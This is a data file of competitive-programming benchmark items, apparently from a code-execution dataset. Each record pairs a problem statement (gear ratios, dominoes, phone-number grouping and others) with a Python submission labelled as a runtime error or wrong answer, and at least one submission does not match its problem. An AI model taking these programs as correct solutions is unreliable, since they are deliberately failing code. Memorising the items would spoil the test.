{"difficulty":900,"lang":"PyPy 3","lang_cluster":"python","src_uid":"102667eaa3aee012fef70f4192464674","submission_id":"re_121","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"n=int(input())\nL=list(map(int,input().split()))\nm=int(input())\nM=list(map(int,input().split()))\nN=[]\nmaxi=0\ncount=0\nfor i in range(0,m):\n\tfor j in range(0,n):\n\t\ttemp=L[i]\/\/M[j]\n\t\tif(L[i]%M[j]==0):\n\t\t\tN.append(temp)\n\t\t\tif(temp>maxi):\n\t\t\t\tmaxi=temp\n\nfor i in range(0,len(N)):\n\tif(N[i]==maxi):\n\t\tcount+=1\n\nprint(count)\n","description":"Vasya's bicycle chain drive consists of two parts: n stars are attached to the pedal axle, m stars are attached to the rear wheel axle. The chain helps to rotate the rear wheel by transmitting the pedal rotation.We know that the i-th star on the pedal axle has ai (0\u2009&lt;\u2009a1\u2009&lt;\u2009a2\u2009&lt;\u2009...\u2009&lt;\u2009an) teeth, and the j-th star on the rear wheel axle has bj (0\u2009&lt;\u2009b1\u2009&lt;\u2009b2\u2009&lt;\u2009...\u2009&lt;\u2009bm) teeth. Any pair (i,\u2009j) (1\u2009\u2264\u2009i\u2009\u2264\u2009n;\u00a01\u2009\u2264\u2009j\u2009\u2264\u2009m) is called a gear and sets the indexes of stars to which the chain is currently attached. Gear (i,\u2009j) has a gear ratio, equal to the value .Since Vasya likes integers, he wants to find such gears (i,\u2009j), that their ratios are integers. On the other hand, Vasya likes fast driving, so among all \"integer\" gears (i,\u2009j) he wants to choose a gear with the maximum ratio. Help him to find the number of such gears.In the problem, fraction  denotes division in real numbers, that is, no rounding is performed.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of stars on the bicycle's pedal axle. The second line contains n integers a1,\u2009a2,\u2009...,\u2009an (1\u2009\u2264\u2009ai\u2009\u2264\u2009104) in the order of strict increasing. The third input line contains integer m (1\u2009\u2264\u2009m\u2009\u2264\u200950) \u2014 the number of stars on the rear wheel axle. The fourth line contains m integers b1,\u2009b2,\u2009...,\u2009bm (1\u2009\u2264\u2009bi\u2009\u2264\u2009104) in the order of strict increasing. It is guaranteed that there exists at least one gear (i,\u2009j), that its gear ratio is an integer. The numbers on the lines are separated by spaces.","output_spec":"Print the number of \"integer\" gears with the maximum ratio among all \"integer\" gears.","notes":"NoteIn the first sample the maximum \"integer\" gear ratio equals 3. There are two gears that have such gear ratio. For one of them a1\u2009=\u20094,\u2009b1\u2009=\u200912, and for the other a2\u2009=\u20095,\u2009b3\u2009=\u200915.","sample_inputs":["2\n4 5\n3\n12 13 15","4\n1 2 3 4\n5\n10 11 12 13 14"],"sample_outputs":["2","1"]}
{"difficulty":1400,"lang":"Python 3","lang_cluster":"python","src_uid":"138fd96bf5a677a6d59c20f88fd612f1","submission_id":"re_406","tags":["greedy","math"],"exec_outcome":"RUNTIME_ERROR","source_code":"n, x, y = int(input()),int(input()),int(input())\n\na = y-n+1\n\nif a**2 + n - 1 >= x:\n    print(a)\n    for i in range(n-1):\n        print(1)\nelse:\n    print(-1)\n","description":"Little Petya loves inequations. Help him find n positive integers a1,\u2009a2,\u2009...,\u2009an, such that the following two conditions are satisfied: a12\u2009+\u2009a22\u2009+\u2009...\u2009+\u2009an2\u2009\u2265\u2009x a1\u2009+\u2009a2\u2009+\u2009...\u2009+\u2009an\u2009\u2264\u2009y","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three space-separated integers n, x and y (1\u2009\u2264\u2009n\u2009\u2264\u2009105,\u20091\u2009\u2264\u2009x\u2009\u2264\u20091012,\u20091\u2009\u2264\u2009y\u2009\u2264\u2009106). Please do not use the %lld specificator to read or write 64-bit integers in \u0421++. It is recommended to use cin, cout streams or the %I64d specificator.","output_spec":"Print n positive integers that satisfy the conditions, one integer per line. If such numbers do not exist, print a single number \"-1\". If there are several solutions, print any of them.","notes":null,"sample_inputs":["5 15 15","2 3 2","1 99 11"],"sample_outputs":["4\n4\n1\n1\n2","-1","11"]}
{"difficulty":1200,"lang":"Python 3","lang_cluster":"python","src_uid":"15fa49860e978d3b3fb7a20bf9f8aa86","submission_id":"re_712","tags":["implementation","geometry","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"from math import sqrt\n\nn, v1, v2 = [int(i) for i in input().split()]\nx = [int(i) for i in input().split()]\nx1, y1 = [int(i) for i in input().split()]\n\nminim = x[1] \/ v1 + sqrt((x1-x[1])**2 + (y1)**2) \/ v2 #\u0412\u0440\u0435\u043c\u044f, \u0435\u0441\u043b\u0438 \u0441\u0442\u0443\u0434\u0435\u043d \u0432\u044b\u0439\u0434\u0435\u0442 \u043d\u0430 \u043f\u0435\u0440\u0432\u043e\u0439 \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u043a\u0435 \u0438 \u043f\u043e\u0431\u0435\u0436\u0438\u0442 (\u0435\u0441\u043b\u0438 \u043e\u043d \u0431\u044b\u0441\u0442\u0440\u0435\u0435 \u0430\u0432\u0442\u043e\u0431\u0443\u0441\u0430)\nres = 2\nfor i in range(2, n):\n    t = x[i] \/ v1 + sqrt((x1-x[i])**2 + (y1)**2) \/ v2\n    if t < minim:\n        minim = t\n        res = i + 1\n    elif t == minim and sqrt((x1-x[res-1])**2 + (y1)**2) < sqrt((x1-x[i])**2 + (y1)**2):\n        res = i+1\nprint(res)","description":"And again a misfortune fell on Poor Student. He is being late for an exam.Having rushed to a bus stop that is in point (0,\u20090), he got on a minibus and they drove along a straight line, parallel to axis OX, in the direction of increasing x.Poor Student knows the following:   during one run the minibus makes n stops, the i-th stop is in point (xi,\u20090)  coordinates of all the stops are different  the minibus drives at a constant speed, equal to vb  it can be assumed the passengers get on and off the minibus at a bus stop momentarily  Student can get off the minibus only at a bus stop  Student will have to get off the minibus at a terminal stop, if he does not get off earlier  the University, where the exam will be held, is in point (xu,\u2009yu)  Student can run from a bus stop to the University at a constant speed vs as long as needed  a distance between two points can be calculated according to the following formula:   Student is already on the minibus, so, he cannot get off at the first bus stop Poor Student wants to get to the University as soon as possible. Help him to choose the bus stop, where he should get off. If such bus stops are multiple, choose the bus stop closest to the University.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains three integer numbers: 2\u2009\u2264\u2009n\u2009\u2264\u2009100, 1\u2009\u2264\u2009vb,\u2009vs\u2009\u2264\u20091000. The second line contains n non-negative integers in ascending order: coordinates xi of the bus stop with index i. It is guaranteed that x1 equals to zero, and xn\u2009\u2264\u2009105. The third line contains the coordinates of the University, integers xu and yu, not exceeding 105 in absolute value. ","output_spec":"In the only line output the answer to the problem \u2014 index of the optimum bus stop.","notes":"NoteAs you know, students are a special sort of people, and minibuses usually do not hurry. That's why you should not be surprised, if Student's speed is higher than the speed of the minibus.","sample_inputs":["4 5 2\n0 2 4 6\n4 1","2 1 1\n0 100000\n100000 100000"],"sample_outputs":["3","2"]}
{"difficulty":1200,"lang":"Python 2","lang_cluster":"python","src_uid":"1ae2942b72ebb7c55359c41e141900d7","submission_id":"re_546","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"import sys\n\nanswer = [0,0,0,0,0]\nn = map(int,raw_input().split())[0]\np = map(int,raw_input().split())\nbalance = 0\nprices = map(int,raw_input().split())[::-1]\n#print prices\nfor i in xrange(n):\n    balance += p[i]\n    j = 0\n    while(j<5):\n        #print i, balance, j\n        if (balance>=prices[j]):\n            answer[j]+=1\n            balance-=prices[j]\n            j -= 1\n        j+=1\n        #print j\nprint \" \".join(map(str,answer[::-1]))\nprint balance","description":"Vasya, like many others, likes to participate in a variety of sweepstakes and lotteries. Now he collects wrappings from a famous chocolate bar \"Jupiter\". According to the sweepstake rules, each wrapping has an integer written on it \u2014 the number of points that the participant adds to his score as he buys the bar. After a participant earns a certain number of points, he can come to the prize distribution center and exchange the points for prizes. When somebody takes a prize, the prize's cost is simply subtracted from the number of his points.Vasya didn't only bought the bars, he also kept a record of how many points each wrapping cost. Also, he remembers that he always stucks to the greedy strategy \u2014 as soon as he could take at least one prize, he went to the prize distribution centre and exchanged the points for prizes. Moreover, if he could choose between multiple prizes, he chose the most expensive one. If after an exchange Vasya had enough points left to get at least one more prize, then he continued to exchange points.The sweepstake has the following prizes (the prizes are sorted by increasing of their cost):   a mug (costs a points),  a towel (costs b points),  a bag (costs c points),  a bicycle (costs d points),  a car (costs e points). Now Vasya wants to recollect what prizes he has received. You know sequence p1,\u2009p2,\u2009...,\u2009pn, where pi is the number of points Vasya got for the i-th bar. The sequence of points is given in the chronological order. You also know numbers a, b, c, d, e. Your task is to find, how many prizes Vasya received, what prizes they are and how many points he's got left after all operations are completed.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u200950) \u2014 the number of chocolate bar wrappings that brought points to Vasya. The second line contains space-separated integers p1,\u2009p2,\u2009...,\u2009pn (1\u2009\u2264\u2009pi\u2009\u2264\u2009109). The third line contains 5 integers a, b, c, d, e (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009&lt;\u2009c\u2009&lt;\u2009d\u2009&lt;\u2009e\u2009\u2264\u2009109) \u2014 the prizes' costs.","output_spec":"Print on the first line 5 integers, separated by a space \u2014 the number of mugs, towels, bags, bicycles and cars that Vasya has got, respectively. On the second line print a single integer \u2014 the number of points Vasya will have left after all operations of exchange are completed. Please, do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use the cin, cout streams or the %I64d specifier.","notes":"NoteIn the first sample Vasya gets 3 points after eating the first chocolate bar. Then he exchanges 2 points and gets a mug. Vasya wins a bag after eating the second chocolate bar. Then he wins a towel after eating the third chocolate bar. After all chocolate bars 3\u2009-\u20092\u2009+\u200910\u2009-\u200910\u2009+\u20094\u2009-\u20094\u2009=\u20091 points remains.","sample_inputs":["3\n3 10 4\n2 4 10 15 20","4\n10 4 39 2\n3 5 10 11 12"],"sample_outputs":["1 1 1 0 0 \n1","3 0 1 0 3 \n0"]}
{"difficulty":1200,"lang":"Python 2","lang_cluster":"python","src_uid":"3d6411d67c85f6293f1999ccff2cd8ba","submission_id":"re_306","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"#!\/usr\/local\/bin\/python\n\nn,limit = map(int,raw_input().split(\" \"))\nary = map(int,raw_input().split(\" \"))\ncomp = [\"-\" for i in xrange(n)]\n\nnum = 0\nwhile True:\n        if ary == comp:\n                print num\n                exit()\n        t = 0\n        for i in xrange(len(ary)):\n                if ary[i] == \"-\":\n                        continue\n                if i == 0 or t == 0:\n                        tmp = ary[i]\n                        ary[i] += 1\n                        t = 1\n                elif tmp != ary[i]:\n                        tmp = ary[i]\n                        ary[i] += 1\n                if ary[i] == limit:\n                        ary[i] = \"-\"\n        num += 1","description":"In a strategic computer game \"Settlers II\" one has to build defense structures to expand and protect the territory. Let's take one of these buildings. At the moment the defense structure accommodates exactly n soldiers. Within this task we can assume that the number of soldiers in the defense structure won't either increase or decrease.Every soldier has a rank \u2014 some natural number from 1 to k. 1 stands for a private and k stands for a general. The higher the rank of the soldier is, the better he fights. Therefore, the player profits from having the soldiers of the highest possible rank.To increase the ranks of soldiers they need to train. But the soldiers won't train for free, and each training session requires one golden coin. On each training session all the n soldiers are present.At the end of each training session the soldiers' ranks increase as follows. First all the soldiers are divided into groups with the same rank, so that the least possible number of groups is formed. Then, within each of the groups where the soldiers below the rank k are present, exactly one soldier increases his rank by one.You know the ranks of all n soldiers at the moment. Determine the number of golden coins that are needed to increase the ranks of all the soldiers to the rank k.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains two integers n and k (1\u2009\u2264\u2009n,\u2009k\u2009\u2264\u2009100). They represent the number of soldiers and the number of different ranks correspondingly. The second line contains n numbers in the non-decreasing order. The i-th of them, ai, represents the rank of the i-th soldier in the defense building (1\u2009\u2264\u2009i\u2009\u2264\u2009n, 1\u2009\u2264\u2009ai\u2009\u2264\u2009k).","output_spec":"Print a single integer \u2014 the number of golden coins needed to raise all the soldiers to the maximal rank.","notes":"NoteIn the first example the ranks will be raised in the following manner:1 2 2 3 \u2009\u2192\u2009 2 2 3 4 \u2009\u2192\u2009 2 3 4 4 \u2009\u2192\u2009 3 4 4 4 \u2009\u2192\u2009 4 4 4 4Thus totals to 4 training sessions that require 4 golden coins.","sample_inputs":["4 4\n1 2 2 3","4 3\n1 1 1 1"],"sample_outputs":["4","5"]}
{"difficulty":1100,"lang":"Python 3","lang_cluster":"python","src_uid":"54c748dd983b6a0ea1af1153d08f1c01","submission_id":"re_1283","tags":[],"exec_outcome":"RUNTIME_ERROR","source_code":"n = int(input())\nst = list(input())\nans = 0\ni = 0\nwhile st and i < len(st):\n    if st[i] == 'L':\n        n -= i + 1\n        st = st[i + 1:]\n        i = -1\n    elif st[i] == 'R':\n        n -= 1\n        for j in range(i + 1, len(st)):\n            if st[j] == 'L':\n                n -= j - i\n                if (j - i) % 2 == 0:\n                    n += 1\n                st = st[j + 1:]\n                i = -1\n                break\n            if st[j] == 'R':\n                n -= j - i - 1\n                st = st[j:]\n                i = -1\n                break\n        n -= j - i\n    i += 1\nprint(n)","description":"Little Chris knows there's no fun in playing dominoes, he thinks it's too random and doesn't require skill. Instead, he decided to play with the dominoes and make a \"domino show\".Chris arranges n dominoes in a line, placing each piece vertically upright. In the beginning, he simultaneously pushes some of the dominoes either to the left or to the right. However, somewhere between every two dominoes pushed in the same direction there is at least one domino pushed in the opposite direction.After each second, each domino that is falling to the left pushes the adjacent domino on the left. Similarly, the dominoes falling to the right push their adjacent dominoes standing on the right. When a vertical domino has dominoes falling on it from both sides, it stays still due to the balance of the forces. The figure shows one possible example of the process.  Given the initial directions Chris has pushed the dominoes, find the number of the dominoes left standing vertically at the end of the process!","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u20093000), the number of the dominoes in the line. The next line contains a character string s of length n. The i-th character of the string si is equal to    \"L\", if the i-th domino has been pushed to the left;  \"R\", if the i-th domino has been pushed to the right;  \".\", if the i-th domino has not been pushed.  It is guaranteed that if si\u2009=\u2009sj\u2009=\u2009\"L\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"R\"; if si\u2009=\u2009sj\u2009=\u2009\"R\" and i\u2009&lt;\u2009j, then there exists such k that i\u2009&lt;\u2009k\u2009&lt;\u2009j and sk\u2009=\u2009\"L\".","output_spec":"Output a single integer, the number of the dominoes that remain vertical at the end of the process.","notes":"NoteThe first example case is shown on the figure. The four pieces that remain standing vertically are highlighted with orange.In the second example case, all pieces fall down since the first piece topples all the other pieces.In the last example case, a single piece has not been pushed in either direction.","sample_inputs":["14\n.L.R...LR..L..","5\nR....","1\n."],"sample_outputs":["4","0","1"]}
{"difficulty":1100,"lang":"Python 2","lang_cluster":"python","src_uid":"5d11fa8528f1dc873d50b3417bef8c79","submission_id":"re_863","tags":["implementation","brute force"],"exec_outcome":"RUNTIME_ERROR","source_code":"import math\n\nn = int(raw_input())\nSs = []\nDs = []\nTs = []\nDp = []\nTp = []\n\nfor i in range(n+1):\n    Ss.append(tuple(int(i) for i in raw_input().split()))\n\nVs, Vp = [int(i) for i in raw_input().split()]\nPs = tuple(int(i) for i in raw_input().split())\n\nt = 0\nfor i in range(n):\n    d = 0\n    for c in range(3):\n        d += (Ss[i+1][c] - Ss[i][c])**2\n    d = d**.5\n    Ds.append(d)\n    t += d\/Vs\n    Ts.append(t)\n\nfor i in range(n):\n    d = 0\n    t = 0\n    for c in range(3):\n        d += (Ss[i+1][c] - Ps[c])**2\n    d = d**.5\n    Dp.append(d)\n    t = d\/Vp\n    Tp.append(t)\n\nprint \"Ss\", Ss\nprint \"Ps\", Ps\nprint \"Ds\", Ds\nprint \"Ts\", Ts\nprint \"Dp\", Dp\nprint \"Tp\", Tp\n\"\"\"\nif Tp[-1]  T\nfor i in range(n):\n    if Tp[i] >\n\"\"\"\n","description":"Little Petya often travels to his grandmother in the countryside. The grandmother has a large garden, which can be represented as a rectangle 1\u2009\u00d7\u2009n in size, when viewed from above. This rectangle is divided into n equal square sections. The garden is very unusual as each of the square sections possesses its own fixed height and due to the newest irrigation system we can create artificial rain above each section.Creating artificial rain is an expensive operation. That's why we limit ourselves to creating the artificial rain only above one section. At that, the water from each watered section will flow into its neighbouring sections if their height does not exceed the height of the section. That is, for example, the garden can be represented by a 1\u2009\u00d7\u20095 rectangle, where the section heights are equal to 4, 2, 3, 3, 2. Then if we create an artificial rain over any of the sections with the height of 3, the water will flow over all the sections, except the ones with the height of 4. See the illustration of this example at the picture:  As Petya is keen on programming, he decided to find such a section that if we create artificial rain above it, the number of watered sections will be maximal. Help him. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u20091000). The second line contains n positive integers which are the height of the sections. All the numbers are no less than 1 and not more than 1000.","output_spec":"Print a single number, the maximal number of watered sections if we create artificial rain above exactly one section.","notes":null,"sample_inputs":["1\n2","5\n1 2 1 2 1","8\n1 2 1 1 1 3 3 4"],"sample_outputs":["1","3","6"]}
{"difficulty":1500,"lang":"Python 3","lang_cluster":"python","src_uid":"5e055bad1da5bdc84599d6f2f89fbd12","submission_id":"re_1379","tags":["data structures","binary search"],"exec_outcome":"RUNTIME_ERROR","source_code":"import math\nn = int(input())\nfront = dict()\nback = dict()\nfor i in range(n):\n    a, b = map(int,input().split())\n    if a in front:\n        front[a] += 1\n    else:\n        front[a] = 1\n        \n    if b in back:\n        back[b] += 1\n    else:\n        back[b] = 1\n\nans = -1\nm = dict()\nfor key, value in front.items():\n    if value >= n\/2:\n        ans = 0\n        break\n    elif key in back and front[key] + back[key] >= n\/2:\n        m[key] = math.ceil(n\/2) - front[key]\n\nelse:\n    if len(m) > 0:\n        ans = min(sorted(m.values()))\n    else:\n        for key, value in back.items():\n            if value >= n\/2:\n                ans = math.ceil(n\/2)\n                break\n        else:\n            ans = -1\nprint(ans)","description":"The Little Elephant loves to play with color cards.He has n cards, each has exactly two colors (the color of the front side and the color of the back side). Initially, all the cards lay on the table with the front side up. In one move the Little Elephant can turn any card to the other side. The Little Elephant thinks that a set of cards on the table is funny if at least half of the cards have the same color (for each card the color of the upper side is considered).Help the Little Elephant to find the minimum number of moves needed to make the set of n cards funny.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009105) \u2014 the number of the cards. The following n lines contain the description of all cards, one card per line. The cards are described by a pair of positive integers not exceeding 109 \u2014 colors of both sides. The first number in a line is the color of the front of the card, the second one \u2014 of the back. The color of the front of the card may coincide with the color of the back of the card. The numbers in the lines are separated by single spaces.","output_spec":"On a single line print a single integer \u2014 the sought minimum number of moves. If it is impossible to make the set funny, print -1.","notes":"NoteIn the first sample there initially are three cards lying with colors 4, 4, 7. Since two of the three cards are of the same color 4, you do not need to change anything, so the answer is 0.In the second sample, you can turn the first and the fourth cards. After that three of the five cards will be of color 7.","sample_inputs":["3\n4 7\n4 7\n7 4","5\n4 7\n7 4\n2 11\n9 7\n1 1"],"sample_outputs":["0","2"]}
{"difficulty":1100,"lang":"Python 3","lang_cluster":"python","src_uid":"65fea461d3caa5a932d1e2c13e99a59e","submission_id":"re_1113","tags":["math"],"exec_outcome":"RUNTIME_ERROR","source_code":"n, b = map(int, input().split())\nt = list(map(int, input().split()))\ns, d = sum(t), max(t)\nb -= d * n - s\nif b < 0: print(-1)\nd += b \/ n\nfor i in range(n): t[i] = str(d - t[i])\nprint('\\n'.join(t))","description":"A group of n merry programmers celebrate Robert Floyd's birthday. Polucarpus has got an honourable task of pouring Ber-Cola to everybody. Pouring the same amount of Ber-Cola to everybody is really important. In other words, the drink's volume in each of the n mugs must be the same.Polycarpus has already began the process and he partially emptied the Ber-Cola bottle. Now the first mug has a1 milliliters of the drink, the second one has a2 milliliters and so on. The bottle has b milliliters left and Polycarpus plans to pour them into the mugs so that the main equation was fulfilled.Write a program that would determine what volume of the drink Polycarpus needs to add into each mug to ensure that the following two conditions were fulfilled simultaneously:   there were b milliliters poured in total. That is, the bottle need to be emptied;  after the process is over, the volumes of the drink in the mugs should be equal. ","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a pair of integers n, b (2\u2009\u2264\u2009n\u2009\u2264\u2009100,\u20091\u2009\u2264\u2009b\u2009\u2264\u2009100), where n is the total number of friends in the group and b is the current volume of drink in the bottle. The second line contains a sequence of integers a1,\u2009a2,\u2009...,\u2009an (0\u2009\u2264\u2009ai\u2009\u2264\u2009100), where ai is the current volume of drink in the i-th mug.","output_spec":"Print a single number \"-1\" (without the quotes), if there is no solution. Otherwise, print n float numbers c1,\u2009c2,\u2009...,\u2009cn, where ci is the volume of the drink to add in the i-th mug. Print the numbers with no less than 6 digits after the decimal point, print each ci on a single line. Polycarpus proved that if a solution exists then it is unique. Russian locale is installed by default on the testing computer. Make sure that your solution use the point to separate the integer part of a real number from the decimal, not a comma.","notes":null,"sample_inputs":["5 50\n1 2 3 4 5","2 2\n1 100"],"sample_outputs":["12.000000\n11.000000\n10.000000\n9.000000\n8.000000","-1"]}
{"difficulty":800,"lang":"PyPy 3","lang_cluster":"python","src_uid":"69850c2af99d60711bcff5870575e15e","submission_id":"re_585","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"d=list(map(int,input().split()))\na,b=map(int,input().split())\nprint(sum(d[a-1:b-1]))","description":"The Berland Armed Forces System consists of n ranks that are numbered using natural numbers from 1 to n, where 1 is the lowest rank and n is the highest rank.One needs exactly di years to rise from rank i to rank i\u2009+\u20091. Reaching a certain rank i having not reached all the previous i\u2009-\u20091 ranks is impossible.Vasya has just reached a new rank of a, but he dreams of holding the rank of b. Find for how many more years Vasya should serve in the army until he can finally realize his dream.","input_from":"standard input","output_to":"standard output","input_spec":"The first input line contains an integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100). The second line contains n\u2009-\u20091 integers di (1\u2009\u2264\u2009di\u2009\u2264\u2009100). The third input line contains two integers a and b (1\u2009\u2264\u2009a\u2009&lt;\u2009b\u2009\u2264\u2009n). The numbers on the lines are space-separated.","output_spec":"Print the single number which is the number of years that Vasya needs to rise from rank a to rank b.","notes":null,"sample_inputs":["3\n5 6\n1 2","3\n5 6\n1 3"],"sample_outputs":["5","11"]}
{"difficulty":1300,"lang":"PyPy 3","lang_cluster":"python","src_uid":"6cfd3b0a403212ec68bac1667bce9ef1","submission_id":"re_662","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"c=[0]*1000001\nn=int(input())\nmi=ma=k=0\nfor i in range(n):\n   a,b=input().split()\n   b=int(b)\n   if a==\"+\": k+=1; c[b]=1\n   else: \n      if c[b]: k-=1; c[b]=0\n      else: mi-=1\n   ma=max(ma,k)\n   mi=min(mi,k)\nprint(ma-mi)\n","description":"Berland National Library has recently been built in the capital of Berland. In addition, in the library you can take any of the collected works of Berland leaders, the library has a reading room.Today was the pilot launch of an automated reading room visitors' accounting system! The scanner of the system is installed at the entrance to the reading room. It records the events of the form \"reader entered room\", \"reader left room\". Every reader is assigned a registration number during the registration procedure at the library \u2014 it's a unique integer from 1 to 106. Thus, the system logs events of two forms:  \"+ ri\" \u2014 the reader with registration number ri entered the room;  \"- ri\" \u2014 the reader with registration number ri left the room. The first launch of the system was a success, it functioned for some period of time, and, at the time of its launch and at the time of its shutdown, the reading room may already have visitors.Significant funds of the budget of Berland have been spent on the design and installation of the system. Therefore, some of the citizens of the capital now demand to explain the need for this system and the benefits that its implementation will bring. Now, the developers of the system need to urgently come up with reasons for its existence.Help the system developers to find the minimum possible capacity of the reading room (in visitors) using the log of the system available to you.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a positive integer n (1\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 the number of records in the system log. Next follow n events from the system journal in the order in which the were made. Each event was written on a single line and looks as \"+ ri\" or \"- ri\", where ri is an integer from 1 to 106, the registration number of the visitor (that is, distinct visitors always have distinct registration numbers). It is guaranteed that the log is not contradictory, that is, for every visitor the types of any of his two consecutive events are distinct. Before starting the system, and after stopping the room may possibly contain visitors.","output_spec":"Print a single integer \u2014 the minimum possible capacity of the reading room.","notes":"NoteIn the first sample test, the system log will ensure that at some point in the reading room were visitors with registration numbers 1, 1200 and 12001. More people were not in the room at the same time based on the log. Therefore, the answer to the test is 3.","sample_inputs":["6\n+ 12001\n- 12001\n- 1\n- 1200\n+ 1\n+ 7","2\n- 1\n- 2","2\n+ 1\n- 1"],"sample_outputs":["3","2","1"]}
{"difficulty":1100,"lang":"Python 2","lang_cluster":"python","src_uid":"6f6859aabc1c9cbb9ee0d910064d87c2","submission_id":"re_838","tags":["implementation"],"exec_outcome":"RUNTIME_ERROR","source_code":"from sys import stdin\n\nn = int(stdin.readline())\nm = int(stdin.readline())\na = []\n\nif n % 2:\n  a.append(m % 1000)\n  m \/= 1000\n\nwhile m:\n  a.append(m % 100)\n  m \/= 100\n  \nprint '-'.join(map(str, reversed(a)))","description":"Phone number in Berland is a sequence of n digits. Often, to make it easier to memorize the number, it is divided into groups of two or three digits. For example, the phone number 1198733 is easier to remember as 11-987-33. Your task is to find for a given phone number any of its divisions into groups of two or three digits.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) \u2014 amount of digits in the phone number. The second line contains n digits \u2014 the phone number to divide into groups.","output_spec":"Output any of divisions of the given phone number into groups of two or three digits. Separate groups by single character -. If the answer is not unique, output any.","notes":null,"sample_inputs":["6\n549871","7\n1198733"],"sample_outputs":["54-98-71","11-987-33"]}
{"difficulty":800,"lang":"Python 2","lang_cluster":"python","src_uid":"7170c40405cf7a5e0f2bd15e4c7d189d","submission_id":"re_117","tags":["implementation","brute force"],"exec_outcome":"WRONG_ANSWER","source_code":"def main():\n    n = input()\n    pos = 1\n    for i in range(1, n):\n        pos = (pos + i) % n\n        print pos,\n\nif __name__ == '__main__':\n    main()\n","description":"A kindergarten teacher Natalia Pavlovna has invented a new ball game. This game not only develops the children's physique, but also teaches them how to count. The game goes as follows. Kids stand in circle. Let's agree to think of the children as numbered with numbers from 1 to n clockwise and the child number 1 is holding the ball. First the first child throws the ball to the next one clockwise, i.e. to the child number 2. Then the child number 2 throws the ball to the next but one child, i.e. to the child number 4, then the fourth child throws the ball to the child that stands two children away from him, i.e. to the child number 7, then the ball is thrown to the child who stands 3 children away from the child number 7, then the ball is thrown to the child who stands 4 children away from the last one, and so on. It should be mentioned that when a ball is thrown it may pass the beginning of the circle. For example, if n\u2009=\u20095, then after the third throw the child number 2 has the ball again. Overall, n\u2009-\u20091 throws are made, and the game ends.The problem is that not all the children get the ball during the game. If a child doesn't get the ball, he gets very upset and cries until Natalia Pavlovna gives him a candy. That's why Natalia Pavlovna asks you to help her to identify the numbers of the children who will get the ball after each throw.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains integer n (2\u2009\u2264\u2009n\u2009\u2264\u2009100) which indicates the number of kids in the circle.","output_spec":"In the single line print n\u2009-\u20091 numbers which are the numbers of children who will get the ball after each throw. Separate the numbers by spaces.","notes":null,"sample_inputs":["10","3"],"sample_outputs":["2 4 7 1 6 2 9 7 6","2 1"]}
{"difficulty":1300,"lang":"Python 3","lang_cluster":"python","src_uid":"782b819eb0bfc86d6f96f15ac09d5085","submission_id":"re_1019","tags":["math"],"exec_outcome":"WRONG_ANSWER","source_code":"def fstexp(x,y):\n    if (y==1):\n        return x%1000000007\n    if (y%2==1):\n        return ((((fstexp(x,y\/\/2)%1000000007)**2)%1000000007)*(x%1000000007))%1000000007\n    return (((fstexp(x,y\/\/2)%1000000007)**2)%1000000007)\nx=int(input())\nx=fstexp(2,x)\nx=x%1000000007\nprint(int((((x**2)+x)\/\/2)%1000000007))\n","description":"Dwarfs have planted a very interesting plant, which is a triangle directed \"upwards\". This plant has an amusing feature. After one year a triangle plant directed \"upwards\" divides into four triangle plants: three of them will point \"upwards\" and one will point \"downwards\". After another year, each triangle plant divides into four triangle plants: three of them will be directed in the same direction as the parent plant, and one of them will be directed in the opposite direction. Then each year the process repeats. The figure below illustrates this process.  Help the dwarfs find out how many triangle plants that point \"upwards\" will be in n years.","input_from":"standard input","output_to":"standard output","input_spec":"The first line contains a single integer n (0\u2009\u2264\u2009n\u2009\u2264\u20091018) \u2014 the number of full years when the plant grew. Please do not use the %lld specifier to read or write 64-bit integers in \u0421++. It is preferred to use cin, cout streams or the %I64d specifier.","output_spec":"Print a single integer \u2014 the remainder of dividing the number of plants that will point \"upwards\" in n years by 1000000007 (109\u2009+\u20097).","notes":"NoteThe first test sample corresponds to the second triangle on the figure in the statement. The second test sample corresponds to the third one.","sample_inputs":["1","2"],"sample_outputs":["3","10"]}
